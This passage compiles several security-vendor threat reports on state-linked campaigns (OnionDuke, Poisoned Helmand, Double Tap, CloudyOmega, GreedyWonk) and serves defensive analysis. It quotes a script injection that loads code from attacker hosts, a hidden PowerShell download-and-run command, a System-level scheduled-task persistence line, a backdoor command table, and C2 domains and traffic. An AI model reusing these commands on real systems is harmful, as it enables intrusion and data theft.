Based on compilation timestamps and discovery dates of samples we have observed , we believe the
OnionDuke operators have been infecting downloaded executables at least since the end of October 2013 .
We also have evidence suggesting that , at least since February of 2014 , OnionDuke has not only been
spread by modifying downloaded executables but also by infecting executables in .torrent files containing
pirated software . However , it would seem that the OnionDuke family is much older , both based on older
compilation timestamps and also on the fact that some of the embedded configuration data make
reference to an apparent version number of 4 suggesting that at least three earlier versions of the family
exist .
During our research , we have also uncovered strong evidence suggesting that OnionDuke has been used in
targeted attacks against European government agencies , although we have so far been unable to identify
the infection vector(s ) . Interestingly , this would suggest two very different targeting strategies . On one
hand is the " shooting a fly with a cannon " mass - infection strategy through modified binaries and , on the
other , the more surgical targeting traditionally associated with APT operations .
In any case , although much is still shrouded in mystery and speculation , one thing is certain . While using
Tor may help you stay anonymous , it does at the same time paint a huge target on your back . It 's never a
good idea to download binaries via Tor ( or anything else ) without encryption . The problem with Tor is
that you have no idea who is maintaining the exit node you are using and what their motives are . VPNs
( such as our Freedome VPN ) will encrypt your connection all the way through the Tor network , so the
maintainers of Tor exit nodes will not see your traffic and ca n't tamper with it .
Samples :
• a75995f94854dea8799650a2f4a97980b71199d2
• b491c14d8cfb48636f6095b7b16555e9a575d57f
• d433f281cf56015941a1c2cb87066ca62ea1db37
Detected as : Trojan - Dropper : W32/OnionDuke . A , Backdoor : W32/OnionDuke . A , and
Backdoor : W32/OnionDuke . B.
Post by — Artturi ( @lehtior2 )

Operation Poisoned Helmand
In this day and age of interconnected cloud services and distributed content delivery networks ( CDNs ) , it
is important for both CDN service providers and security professionals alike to recognize and understand
the risks that these systems can introduce within an modern enterprise . For organizations within both
public and private sectors that leverage CDN platforms to dynamically deliver web content , it is important
that the content is also routinely monitored . Otherwise , malicious third - party content can be loaded into a
target organization ’s website without their knowledge , delivering untold risks to unwitting visitors .
Afghan Government “ Watering Hole ”
The ThreatConnect Intelligence Research Team ( TCIRT ) recently observed a targeted cross - site scripting
( XSS ) “ drive - by ” attack that leveraged a single content delivery network resource to distribute a malicious
Java applet via nearly all of the major official Government of Afghanistan websites . The compromised
CDN resource in question is a JavaScript file hosted at [ http:]//cdn.afghanistan[.]af / scripts / gop - script.js
The domain cdn.afghanistan[.]af is a legitimate CDN site used by the Afghan Ministry of Communications
and IT ( MCIT ) to host web content that is displayed and used on many official gov.af websites .
The javascript URL ( [ http:]//cdn.afghanistan[.]af / scripts / gop - script.js ) is called from numerous official
Afghan Government websites , including the following :
[ http:]//canberra.afghanistan[.]af / en ( Afghan Embassy in Canberra , Australia )
[ http:]//herat.gov[.]af / fa ( Herat Province Regional Government )
[ http:]//mfa.gov[.]af / en ( Ministry of Foreign Affairs )
[ http:]//moci.gov[.]af / en ( Ministry of Commerce and Industries )
[ http:]//moe.gov[.]af / en ( Ministry of Education )
[ http:]//mof.gov[.]af / en ( Ministry of Finance )
[ http:]//moj.gov[.]af / fa ( Ministry of Justice )
[ http:]//mowa.gov[.]af / fa ( Ministry of Women ’s Affairs )
[ http:]//oaacoms.gov[.]af / fa ( Office of Administrative Affairs and Council of Ministers )
It is likely that this javascript URL itself is normally legitimate , but the attackers obtained access to the file
and prepended the following malicious JavaScript functions to the beginning of the script :
document.write("<script src = http://update.javaplug - in.com / o / j.js><\/script > " ) ;
document.write("<script src = http:\/\/neoting.com / pay / danal / PhoneBill/07/1.js >
< \/script > " ) ;
Note that the gov.af websites would not need to be compromised individually for this attack to be
delivered to visitors of the sites , because it is the backend CDN infrastructure that is serving up the
malicious script .
Li Keqiang : A Harbinger of Targeted Exploitation ?
Judging by the last modified timestamp on the HTTP response of gop-script.js , which is Tue , 16 Dec 2014
08:07:06 GMT , this malicious CDN compromise was very recent in nature . In fact , it occurred on the very
same day that China ’s Prime Minister Li Keqiang would meet with Abdullah Abdullah , the Chief Executive
Officer of Afghanistan in Astana Kazakhstan , they would discuss infrastructure development and bilateral
cooperation issues .
Looking at the EXIF metadata of the image of Keqiang meeting with Abdullah that is hosted on the
Chinese embassy website we note a Tue , 16 December 2014 07:43:31 modify time as well as the
www.news[.]cn watermark in the bottom righthand corner . This indicates that the image of Keqiang and
Abdullah was likely taken and edited sometime prior to 07:43:31 . While it is ambiguous as to which
timezone the edits actually took place in ( Kazakhstan or China ) we assume the date
timestamp references GMT because the press release states “ In the afternoon of December 15 local time … ”
If we assume the photograph and afternoon meeting took place sometime prior to 13:43 Alma - Ata
standard time ( + 0600 ) this would closely correspond with a 07:43 GMT time stamp . The modification of
the gop-script.js by the attackers at 08:07:06 GMT likely tracks extremely close to a window of a few hours
in which Keqiang met with Abdullah .
It is worth mentioning that a similar scenario occurred on June 20th when security researcher
PhysicalDrive0 observed a malicious Java file hosted on the Embassy of Greece in Beijing . At the time , a
Chinese delegation led by Keqiang was visiting Greek Prime Minister Antonis Samaras in Athens . Security
researcher R136a1 aka “ thegoldenmessenger ” released a followup blog with detailed analysis of the Greek
embassy compromise .
While these two separate events are not directly related , additional research into the status of ministerial
and official government websites on or around the dates of notable Chinese delegations and or bilateral
meetings may yield additional patterns of interest .
Java Malware Overlap
Upon closer inspection of the prepended malicious JavaScript code , one will notice the similarity in the
update.javaplug-in[.]com naming convention and URL structure to the C2 domain java - se[.]com found in
the Palo Alto Networks blog post Attacks on East Asia using Google Code for Command and Control and
associated with Operation Poisoned Hurricane . However , the malicious document.write driveby URLs
listed above both result in 403 Forbidden errors as of December 18 , 2014 .
While the 403 Forbidden errors may seem like an analytic dead end , the TCIRT also identified a malicious
Java applet submission to VirusTotal that confirms the nature of this malicious activity . This Java applet ,
SHA1 : 388E6F41462774268491D1F121F333618C6A2C9A , has no antivirus detections as of December
21st . The applet contains its malicious class file at the path “ jre7u61windows / x86/Update.class ” . This
class file downloads and decodes an XOR 0xC8 encoded Windows PE executable payload from
[ http:]//mfa.gov[.]af / content / images / icon35.png , hosted on the official Afghan Ministry of Foreign
Affairs site , which was also affected by the gop - script XSS .
Using historic context archived within ThreatConnect , the TCIRT concluded that this Java applet is from
the same source code as the applet SHA1 : ADC162DD909283097E72FC50B7AB0E04AB8A2BCC , which
was previously observed by the TCIRT at the Operation Poisoned Hurricane related URL
[ http:]//jre7.java - se[.]com / java.jar on August 15 , 2014 . This applet has the same class path , and
downloads an XOR 0xFF encoded payload executable from the URL [ https:]//amco-
triton.co[.]jp/js/dl/in.jpg . Additional indicators and context associated with this particular Java driveby
activity can be found in the ThreatConnect Common Community Incident 20140815A : java - se APT
Driveby ( shared October 02 , 2014 )
The Windows PE Payload
The XOR 0xC8 encoded payload downloaded from [ http:]//mfa.gov[.]af / content / images / icon35.png
decodes into the Windows PE executable SHA1 : 72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB
This executable is a self - extracting ( SFX ) Microsoft Cabinet executable that is digitally signed with a valid
certificate from “ OnAndOn Information System Co. , Ltd. ” , serial number “ 1F F7 D8 64 18 1C 55 5E 70 CF
DD 3A 59 34 C4 7D ” . This same certificate was also used to sign the Java applet that downloaded this
malware .
This executable drops the following files :
SHA1 : 2068260601D60F07829EE0CEDF5A9C636CDB1765 ( dllhost.exe )
Legitimate Microsoft Debugging Tools for Windows Executable , loads dbgeng.dll
SHA1 : E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 ( dbgeng.dll )
Malicious DLL that loads into the above dllhost.exe , using a similar DLL sideloading technique to that
most commonly associated with the PlugX backdoor .
SHA1 : 5C8683E3523C7FA81A0166D7D127616B06334E8D ( Readme.txt )
Malicious encrypted backdoor binary blob loaded by dbgeng.dll
This backdoor connects to the faux Oracle Java themed command and control ( C2 ) domain
oracle0876634.javaplug-in[.]com . Note that javaplug - in[.]com is the same root domain found in the
compromised version of [ http:]//cdn.afghanistan[.]af / scripts / gop - script.js as [ http:]//update.javaplug-
in[.]com / o / j.js , confirming that this Java malware is in fact directly associated with the Afghan MCIT
CDN XSS compromise .
Full indicators of this activity and a YARA rule to detect the malware certificate can be found in the
ThreatConnect Common Community under Incident 20141217A : Afghan Government Java Driveby and
signature APT_OnAndOn_cert.yara .
Conclusion
As the US and NATO reduce their troop levels in Afghanistan , China is posturing to fill the gap of
influence that the west is leaving behind . With plans to facilitate multilateral peace talks with the Taliban
and establish major transportation projects which aim to bolster the Afghan economy , Beijing has been
eyeing Afghanistan as part of its broader South Asian strategy .
By exploiting and co - opting Afghan network infrastructure that is used by multiple ministerial level
websites , Chinese intelligence services would be able to widely distribute malicious payloads to a variety of
global targets using Afghanistan ’s government websites as a topical and trusted distribution platform ,
exploiting a single hidden entry point . This being a variant of a typical “ watering - hole ” attack , the
attackers will most likely infect victims outside the Afghan government who happened to be browsing any
one of the CDN client systems , specifically , partner states involved in the planned troop reduction .
It is important to consider that corporate enterprises are not immune to this tactic , and this is not just a
technique that is used by APT threat actors . If an enterprise ’s website leverages a CDN to speed up content
delivery , unintended consequences must be anticipated . Fortunately , modern browsers now implement a
security concept called “ Content Security Policy ” . As long as the server ’s response headers are configured
properly , third party content may be restricted to originating from a narrow whitelist .
Just as attackers distribute malicious content to users en masse or CDN services distribute web content to
users , security professionals must be able to quickly distribute actionable Threat Intelligence in formats
readable by both humans and machines . ThreatConnect is the industry ’s first comprehensive Threat
Intelligence Platform that enables enterprises to orchestrate the aggregation of Threat Intelligence from
multiple sources , use integrated analytics and a robust API that gives enterprises the control to action
their own Threat Intelligence , in the cloud and on premises . Register for a free account now to view the
Common Community shares and more .

Operation Double Tap
APT3 ( also known as UPS ) , the actors responsible for Operation Clandestine Fox has quietly continued to
send waves of spearphishing messages over the past few months . This actor initiated their most recent
campaign on November 19 , 2014 targeting multiple organizations . The attacker leveraged multiple
exploits , targeting both CVE-2014 - 6332 and CVE-2014 - 4113 . CVE-2014 - 6332 was disclosed publicly on
2014 - 11 - 11 and is a Windows OLE Automation Array Remote Code Execution vulnerability . CVE-2014-
4113 is a privilege escalation vulnerability that was disclosed publicly on 2014 - 10 - 14 .
The use of CVE-2014 - 6332 is notable , as it demonstrates that multiple classes of actors , both criminal and
APT alike , have now incorporated this exploit into their toolkits . Further , the use of both of these two
known vulnerabilities in tandem is notable for APT3 . This actor is historically known for leveraging zero-
day vulnerabilities in widespread but infrequent phishing campaigns . The use of known exploits and more
frequent attacks may indicate both a shift in strategy and operational tempo for this group .
The Spearphish
The body of the message is below :
One Month 's Free Membership for The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS
4,000 MODELS Nude Celebrities , Playmates , Cybergirls & More ! Click
hxxp://join.playboysplus.com / signup/ To Get a Free Plus Member Now & Never Miss Another Update .
Your Member referrals must remain active . If anyone getting " Promotion not available " for 1 month free
membership , you might get the issue up to 48 hrs once your membership is expired and make sure to
Clear out cookies or use another browser or use another PC .
The webpage contained both CVE-2014 - 6332 exploit code and a VBScript that invoked PowerShell on the
affected users’ system to download the below payload :
function runmumaa ( )
On Error Resume Next
set shell = createobject("Shell . Application " )
shell . ShellExecute " powershell.exe","-NoLogo -NoProfile              -NonInteractive -WindowStyle
Hidden ( New - Object
“ System . Net . WebClient”).DownloadFile(“http://www.playboysplus.com
/install / install.exe”,”install.exe”);Invoke - Item install.exe " , " " ,    " open " , 1
end function
The CVE-2014 - 6332 exploit code seen in this incident is derived from the code published at
http://www.exploit-db.com/exploits/35230/ , which has also been incorporated in the Metasploit project .
The Downloader
After the exploit or script executes , the system downloads install.exe , which has the following metadata :
MD5            5a0c4e1925c76a959ab0588f683ab437
Size          46592 bytes
Compile Time 2014 - 11 - 19 08:55:10Z
Import Hash       6b8611f8148a6b51e37fd68e75b6a81c
The file install.exe attempts to write two files ( doc.exe and test.exe ) to the hard - coded path
“ C:\Users\Public ” , which fails on Windows XP because that path is not present by default .
The first dropped file , doc.exe , contains the CVE-2014 - 4113 exploit and then attempts to execute test.exe
with the elevated privileges . These files have the following metadata :
doc.exe ( x86 ) :
MD5           492a839a3bf9c61b7065589a18c5aa8d
Size         12288 bytes
Import Hash 9342d18e7d315117f23db7553d59a9d1
doc.exe ( x64 ) :
MD5           744a17a3bc6dbd535f568ef1e87d8b9a
Size         13824 bytes
Compile Time 2014 - 11 - 19 08:25:45Z
Import Hash 2fab77a3ff40e4f6d9b5b7e813c618e4
test.exe :
MD5             5c08957f05377004376e6a622406f9aa
Size         11264 bytes
Compile Time 2014 - 11 - 18 10:49:23Z
Import Hash f34d5f2d4577ed6d9ceec516c1f5a744
These payload files also have interesting PDB debug strings .
install.exe :
c:\Users\aa\Documents\Visual Studio 2008\Projects\MShell\Release              \MShell.pdb
doc.exe :
c:\Users\aa\Documents\Visual Studio 2008\Projects\4113\Release                \4113.pdb
test.exe :
C:\Users\aa\Documents\Visual Studio 2010\Projects\MyRat\Client\Client
\obj\x86\Release\Client.pdb
The most interesting PDB string is the “ 4113.pdb , ” which appears to reference CVE-2014 - 4113 . This CVE is
a local kernel vulnerability that , with successful exploitation , would give any user SYSTEM access on the
machine .
The malware component , test.exe , uses the Windows command " cmd.exe " /C whoami ” to verify it is
running with the elevated privileges of “ System ” and creates persistence by creating the following
scheduled task :
schtasks /create /tn " mysc " /tr C:\Users\Public\test.exe /sc ONLOGON          /ru " System "
When executed , the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port
1913 . The malware sends the SOCKS5 connection request " 05 01 00 " and verifies the server response
starts with " 05 00 " . The malware then requests a connection to 192.184.60.229 on TCP port 81 using the
command " 05 01 00 01 c0 b8 3c e5 00 51 " and verifies that the first two bytes from the server are " 05 00 "
( c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order ) .
Once the connection to the server is established , the malware expects a message containing at least three
bytes from the server . These first three bytes are the command identifier . The following commands are
supported by the malware :
Command        Description
ID
00 00 00       Content after command ID is written to :
C:\Users\
[ Username]\AppData\Local\Temp\notepad1.exe
00 00 01       Deletes the files :
C:\Users\
[ Username]\AppData\Local\Temp\notepad.exe
C:\Users\
[ Username]\AppData\Local\Temp\newnotepad.exe
00 00 02       Malware exits
00 00 03       Malware downloads the URL that follows the
command ID . The file is saved to :
C:\Users\
[ Username]\AppData\Local\Temp\notepad.exe
00 00 04       Content after command ID is written to :
C:\Users\
[ Username]\AppData\Local\Temp\notepad2.exe
00 00 05       The files notepad1.exe and notepad2.exe are
concatenated together and written to C:\Users\
[ Username]\AppData\Local\Temp\newnotepad.exe
and executed
00 00 06       The contents of the following file is sent to the
server :
C:\Users\
[ Username]\AppData\Local\Temp\note.txt
00 00 07       The string following the command ID is executed
using " cmd /C " and results are sent to server
Links to APT3
On October 28 , we observed APT3 sending out spearphishing messages containing a compressed
executable attachment . The deflated exe was a variant of the same downloader described above and
connected to 198.55.115.71 over port 1913 via SOCKS5 proxy . The secondary payload in that case was
detected as Backdoor . APT.CookieCutter ( aka Pirpi ) and also named newnotepad.exe ( MD5
8849538ef1c3471640230605c2623c67 ) and connected to the known APT3 domains :
inform.bedircati[.]com
pn.lamb-site[.]com
210.109.99.64
The 192.184.60.229 IP address seen in this current campaign also hosts securitywap[.]com – another
known domain referenced in our Operation Clandestine Fox blog .
DOMAIN                     FIRST SEEN      LAST SEEN         IP ADDRESS
securitywap.com            2014 - 11 - 17      2014 - 11 - 20        192.184.60.229
www.securitywap.com        2014 - 11 - 17      2014 - 11 - 20        192.184.60.229
In addition , the join.playboysplus[.]com exploit and payload delivery site resolves to 104.151.248.173 .
This IP has hosted other domains used by APT3 in past campaigns :
DOMAIN                      FIRST SEEN      LAST SEEN         IP ADDRESS
join.playboysplus[.]com     2014 - 11 - 21      2014 - 11 - 21        104.151.248.173
walterclean[.]com           2014 - 11 - 18      2014 - 11 - 20        104.151.248.173
www.walterclean[.]com       2014 - 11 - 18      2014 - 11 - 20        104.151.248.173
As we discussed in our previous blog detailing previous APT3 activity , the walterclean[.]com served as a
Plugx / Kaba command and control server .
Conclusion
Although APT3 is well known for employing zero - day exploits in their attacks , recent activity has
demonstrated that they will also attack targets with known exploits or social engineering .
Since Operation Clandestine Fox , we have observed this actor execute multiple attacks that did not rely on
zero - day exploits . The combination of this sustained operational tempo and lack of zero - day
exploits may indicate that this group has changed strategy and has decided to attack more
frequently and does not have steady access to zero - day exploit code . No matter the strategy ,
this actor has shown an ability to operate successfully .
IOCs for this threat can be found here .

Operation CloudyOmega : Ichitaro zero - day and ongoing
cyberespionage campaign targeting Japan
JustSystems has issued an update to its Ichitaro product line ( Japanese office suite software ) , plugging a
zero - day vulnerability . This vulnerability is being actively exploited in the wild to specifically target
Japanese organizations .
The exploit is sent to the targeted organizations through emails with a malicious Ichitaro document file
attached , which Symantec products detect as Bloodhound . Exploit.557 . Payloads from the exploit may
include Backdoor . Emdivi , Backdoor . Korplug , and Backdoor . ZXshell ; however , all payloads aim to steal
confidential information from the compromised computer .
The content of the emails vary depending on the business interest of the targeted recipient ’s organization ;
however , all are about recent political events associated with Japan . Opening the malicious attachment
with Ichitaro will drop the payload and display the document . Often such exploitation attempts crash and
then relaunch the document viewer to open a clean document in order to trick users into believing it is
legitimate . In this particular attack , opening the document and dropping the payload are done without
crashing Ichitaro and , as such , users have no visual indications as to what is really happening in the
background .
CloudyOmega
As Security Response previously discussed , unpatched vulnerabilities being exploited is nothing new for
Ichitaro . However , during our investigation of this Ichitaro zero - day attack , we discovered that the attack
was in fact part of an ongoing cyberespionage campaign specifically targeting various Japanese
organizations . Symantec has named this attack campaign CloudyOmega . In this campaign , variants of
Backdoor . Emdivi are persistently used as a payload . All attacks arrive on the target computers as an
attachment to email messages . Mostly the attachments are in a simple executable format with a fake icon .
However , some of the files exploit software vulnerabilities , and the aforementioned vulnerability in
Ichitaro software is only one of them . This group ’s primary goal is to steal confidential information from
targeted organizations . This blog provides insights into the history of the attack campaign , infection
methods , malware payload , and the group carrying out the attacks .
Timeline
The first attack of the campaign can be traced back to at least 2011 . Figure 1 shows the targeted sectors
and the number of attacks carried out each year . The perpetrators were very cautious launching attacks in
the early years with attacks beginning in earnest in 2014 . By far , the public sector in Japan is the most
targeted sector hit by Operation CloudyOmega . This provides some clue as to who the attack group is .
Figure 1 . Targeted sectors and number of attacks
Attack vector
Email is the predominant infection vector used in this campaign .
Figure 2 . Sample email used in attack campaign
Figure 2 is an example of an email used in recent attacks prior to those exploiting the Ichitaro zero - day
vulnerability . The emails include password - protected .zip files containing the malware . Ironically , the
attackers follow security best practices by indicating in the first email that the password will be sent to the
recipient in a separate email . This is merely to trick the recipient into believing the email is from a
legitimate and trustworthy source . The body of the email is very short and claims the attachment includes
a medical receipt . The email also requests that the recipient open the attachment on a Windows computer .
The file in the attachment has a Microsoft Word icon but , as indicated within Windows Explorer , it is an
executable file .
Figure 3 . Attached “ document ” is actually a malicious executable file
Payload
The malicious payload is Backdoor . Emdivi , a threat that opens a back door on the compromised
computer . The malware is exclusively used in the CloudyOmega attack campaign and first appeared in
2011 when it was used in an attack against a Japanese chemical company . Emdivi allows the remote
attacker executing the commands to send the results back to the command - and - control ( C&C ) server
through HTTP .
Each Emdivi variant has a unique version number and belongs to one of two types : Type S and Type T.
The unique version number is not only a clear sign that Emdivi is systematically managed , but it also acts
as an encryption key . The malware adds extra words to the version number and then , based on this ,
generates a hash , which it uses as an encryption key .
Both Emdivi Type S and Type T share the following functionality :
Allow a remote attacker to execute code through HTTP
Steal credentials stored by Internet Explorer
Type T is primarily used in Operation CloudyOmega , has been in constant development since the
campaign was first launched in 2011 , and is written in the C++ programing language . Type T employs
techniques to protect itself from security vendors or network administrators . Important parts of Type T ,
such as the C&C server address it contacts and its protection mechanisms , are encrypted . Type T also
detects the presence of automatic analysis systems or debuggers , such as the following :
VirtualMachine
Debugger
Sandbox
Type S , on the other hand , was used only twice in the attack campaign . Type S is a .NET application based
on the same source code and shared C&C infrastructure as Type T. However , protection mechanisms and
encryption , essential features for threat survival , are not present in Type S. One interesting trait of Type S
is that it uses Japanese sentences that seem to be randomly taken from the internet to change the file
hash . For instance , in the example shown in Figure 4 , it uses a sentence talking about the special theory of
relativity .
Figure 4 . Japanese text used by Emdivi Type S variant
Who is Emdivi talking to ?
Once infected , Emdivi connects to hardcoded C&C servers using the HTTP protocol .
So far , a total of 50 unique domains have been identified from 58 Emdivi variants . Almost all websites
used as C&C servers are compromised Japanese websites ranging from sites belonging to small businesses
to personal blogs . We discovered that 40 out of the 50 compromised websites , spread across 13 IP
addresses , are hosted on a single cloud - hosting service based in Japan .
Figure 5 . Single IP hosts multiple compromised websites
The compromised sites are hosted on various pieces of web server software , such as Apache and Microsoft
Internet Information Services ( IIS ) , and are on different website platforms . This indicates that the sites
were not compromised through a vulnerability in a single software product or website platform . Instead ,
the attacker somehow penetrated the cloud service itself and turned the websites into C&C servers for
Backdoor . Emdivi .
The compromised cloud hosting company has been notified but , at the time of writing , has not replied .
Symantec offers two IPS signatures that detect and block network communication between infected
computers and the Emdivi C&C server :
System Infected : Backdoor . Emdivi Activity
System Infected : Backdoor . Emdivi Activity 2
Zero - day and links to other cybercriminal groups
During our research , multiple samples related to this attack campaign were identified and allowed us to
connect the dots , as it were , when it came to CloudyOmega 's connections to other attack groups .
In August 2012 , the CloudyOmega attackers exploited the zero - day Adobe Flash Player and AIR
' copyRawDataTo ( ) ' Integer Overflow Vulnerability ( CVE-2012 - 5054 ) in an attack against a high - profile
organization in Japan . The attackers sent a Microsoft Word file containing a maliciously crafted SWF file
that exploited the vulnerability . Once successfully exploited , the file installed Backdoor . Emdivi . As CVE-
2012 - 5054 was publicly disclosed in the same month , the attack utilized what was , at the time , a zero - day
exploit .
Interestingly , the Flash file that was used in an Emdivi attack in 2012 and the one used in the LadyBoyle
attack in 2013 look very similar .
Figure 6 shows the malformed SWF file executing LadyBoyle ( ) code that attempts to exploit the Adobe
Flash Player CVE-2013 - 0634 Remote Memory Corruption Vulnerability ( CVE-2013 - 0634 ) . The Flash file
seems to have been created using the same framework used by the CloudyOmega group , but with a
different exploit .
Figure 6 . Malformed SWF file used in the LadyBoyle campaign in February 2013
Both attacks use a .doc file containing an Adobe Flash zero - day exploit that is used to install a back door .
No other evidence connects these two different campaigns ; however , as described previously in Symantec
Security Response ’s Elderwood blog , it is strongly believed that a single parent organization has broken
into a number of subgroups that each target a particular industry .
In terms of the latest attack on Ichitaro , we collected a dozen samples of JTD files , all of which are exactly
the same except for their payload . The parent organization , it would seem , supplied the zero - day exploit to
the different subgroups as part of an attack toolkit and each group launched a separate attack using their
chosen malware . This is why three different payloads ( Backdoor . Emdivi , Backdoor . Korplug , and
Backdoor . ZXshell ) were observed in the latest zero - day attack .
Figure 7 . Parent group sharing zero - day exploit
Conclusion
Operation CloudyOmega was launched by an attack group that has communication channels with other
notorious attack groups including Hidden Lynx and the group responsible for LadyBoyle . CloudyOmega
has been in operation since 2011 and is persistent in targeting Japanese organizations . With the latest
attack employing a zero - day vulnerability , there is no indication that the group will stop their activities
anytime soon . Symantec Security Response will be keeping a close eye on the CloudyOmega group .
Protection summary
It is highly recommended that customers using Ichitaro products apply any patches as soon as possible .
Symantec offers the following protection against attacks associated with Operation CloudyOmega :
AV
Backdoor . Emdivi
Backdoor . Emdivi!gen1
Backdoor . Emdivi!gen2
Bloodhound . Exploit.557
Trojan . Mdropper
IPS
System Infected : Backdoor . Emdivi Activity
System Infected : Backdoor . Emdivi Activity 2

Operation GreedyWonk : Multiple Economic and Foreign Policy Sites
Compromised , Serving Up Flash Zero - Day Exploit
Less than a week after uncovering Operation SnowMan , the FireEye Dynamic Threat Intelligence cloud
has identified another targeted attack campaign — this one exploiting a zero - day vulnerability in Flash .
We are collaborating with Adobe security on this issue . Adobe has assigned the CVE identifier CVE-2014-
0502 to this vulnerability and released a security bulletin .
As of this blog post , visitors to at least three nonprofit institutions — two of which focus on matters of
national security and public policy — were redirected to an exploit server hosting the zero - day exploit .
We ’re dubbing this attack “ Operation GreedyWonk . ”
We believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer , based
on consistencies in tradecraft ( particularly with the websites chosen for this strategic Web compromise ) ,
attack infrastructure , and malware configuration properties .
The group behind this campaign appears to have sufficient resources ( such as access to zero - day exploits )
and a determination to infect visitors to foreign and public policy websites . The threat actors likely sought
to infect users to these sites for follow - on data theft , including information related to defense and public
policy matters .
Discovery
On Feb. 13 , FireEye identified a zero - day Adobe Flash exploit that affects the latest version of the Flash
Player ( 12.0.0.4 and 11.7.700.261 ) . Visitors to the Peter G. Peterson Institute for International Economics
( www.piie[.]com ) were redirected to an exploit server hosting this Flash zero - day through a hidden
iframe .
We subsequently found that the American Research Center in Egypt ( www.arce[.]org ) and the Smith
Richardson Foundation ( www.srf[.]org ) also redirected visitors the exploit server . All three organizations
are nonprofit institutions ; the Peterson Institute and Smith Richardson Foundation engage in national
security and public policy issues .
Mitigation
To bypass Windows’ Address Space Layout Randomization ( ASLR ) protections , this exploit targets
computers with any of the following configurations :
Windows XP
Windows 7 and Java 1.6
Windows 7 and an out - of - date version of Microsoft Office 2007 or 2010
Users can mitigate the threat by upgrading from Windows XP and updating Java and Office . If you
have Java 1.6 , update Java to the latest 1.7 version . If you are using an out - of - date Microsoft Office 2007
or 2010 , update Microsoft Office to the latest version .
These mitigations do not patch the underlying vulnerability . But by breaking the exploit ’s ASLR - bypass
measures , they do prevent the current in - the - wild exploit from functioning .
Vulnerability analysis
GreedyWonk targets a previously unknown vulnerability in Adobe Flash . The vulnerability permits an
attacker to overwrite the vftable pointer of a Flash object to redirect code execution .
ASLR bypass
The attack uses only known ASLR bypasses . Details of these techniques are available from our previous
blog post on the subject ( in the “ Non - ASLR modules ” section ) .
For Windows XP , the attackers build a return - oriented programming ( ROP ) chain of MSVCRT ( Visual C
runtime ) gadgets with hard - coded base addresses for English ( “ en ” ) and Chinese ( “ zh - cn ” and “ zh - tw ” ) .
On Windows 7 , the attackers use a hard - coded ROP chain for MSVCR71.dll ( Visual C++ runtime ) if the
user has Java 1.6 , and a hard - coded ROP chain for HXDS.dll ( Help Data Services Module ) if the user has
Microsoft Office 2007 or 2010 .
Java 1.6 is no longer supported and does not receive security updates . In addition to the MSVCR71.dll
ASLR bypass , a variety of widely exploited code - execution vulnerabilities exist in Java 1.6 . That ’s why
FireEye strongly recommends upgrading to Java 1.7 .
The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013 . More details about this
bypass are addressed by Microsoft ’s Security Bulletin MS13 - 106 and an accompanying blog entry .
FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches .
Shellcode analysis
The shellcode is downloaded in ActionScript as a GIF image . Once ROP marks the shellcode as executable
using Windows’ VirtualProtect function , it downloads an executable via the InternetOpenURLA and
InternetReadFile functions . Then it writes the file to disk with CreateFileA and WriteFile functions .
Finally , it runs the file using the WinExec function .
PlugX / Kaba payload analysis
Once the exploit succeeds , a PlugX / Kaba remote access tool ( RAT ) payload with the MD5 hash
507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint . This PlugX sample was
compiled on Feb. 12 , one day before we first observed it , indicating that it was deployed specifically for
this campaign .
This PlugX payload was configured with the following command - and - control ( CnC ) domains :
java.ns1[.]name
adservice.no-ip[.]org
wmi.ns01[.]us
Sample callback traffic was as follows :
POST /D28419029043311C6F8BF9F5 HTTP/1.1
Accept : * / *
HHV1 : 0
HHV2 : 0
HHV3 : 61456
HHV4 : 1
User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ;
InfoPath.2 ; .NET CLR 2.0.50727 ; SV1 )
Host : java.ns1.name
Content - Length : 0
Connection : Keep - Alive
Cache - Control : no - cache
Campaign analysis
Both java.ns1[.]name and adservice.no-ip[.]org resolved to 74.126.177.68 on Feb. 18 , 2014 . Passive DNS
analysis reveals that the domain wmi.ns01.us previously resolved to 103.246.246.103 between July 4 ,
2013 and July 15 , 2013 and 192.74.246.219 on Feb. 17 , 2014 . java.ns1[.]name also resolved to
192.74.246.219 on February 18 .
Domain                   First Seen     Last Seen         IP Address
adservice.no-ip[.]org    2014 - 02 - 18     2014 - 02 - 19        74.126.177.68
java.ns1[.]name          2014 - 02 - 18     2014 - 02 - 19        74.126.177.68
java.ns1[.]name          2014 - 02 - 18     2014 - 02 - 18        192.74.246.219
wmi.ns01[.]us            2014 - 02 - 17     2014 - 02 - 17        192.74.246.219
proxy.ddns[.]info        2013 - 05 - 02     2014 - 02 - 18        103.246.246.103
updatedns.ns02[.]us 2013 - 09 - 06        2013 - 09 - 06       103.246.246.103
updatedns.ns01[.]us 2013 - 09 - 06        2013 - 09 - 06       103.246.246.103
wmi.ns01[.]us        2013 - 07 - 04        2013 - 07 - 15       103.246.246.103
Further research uncovered a number of older malware samples connecting to the same domain
wmi.ns01[.]us .
MD5                                Family Compile Alternate C2s
Time
7995a9a6a889b914e208eb924e459ebc PlugX      2012 - 06 - 09 fuckchina.govnb[.]com
bf60b8d26bc0c94dda2e3471de6ec977 PlugX      2010 - 03 - 15 microsafes.no-ip[.]org
fd69793bd63c44bbb22f9c4d46873252 Poison 2013 - 03 - 07 N / A
Ivy
88b375e3b5c50a3e6c881bc96c926928 Poison 2012 - 06 - 11 N / A
Ivy
cd07a9e49b1f909e1bd9e39a7a6e56b4 Poison 2012 - 06 - 11 N / A
Ivy
Domain                  First Seen    Last Seen        IP Address
fuckchina.govnb[.]com 2013 - 12 - 11     2013 - 12 - 11       204.200.222.136
microsafes.no-ip[.]org 2014 - 02 - 12    2014 - 02 - 12       74.126.177.70
microsafes.no-ip[.]org 2013 - 12 - 04    2013 - 12 - 04       74.126.177.241
The Poison Ivy variants that connected to the domain wmi.ns01[.]us had the following unique
configuration properties :
MD5                               Password                    Mutex
fd69793bd63c44bbb22f9c4d46873252 java7                       NBCD*&^FE
88b375e3b5c50a3e6c881bc96c926928 admin                       ytf^&^333
cd07a9e49b1f909e1bd9e39a7a6e56b4 admin                       ytf^&^333
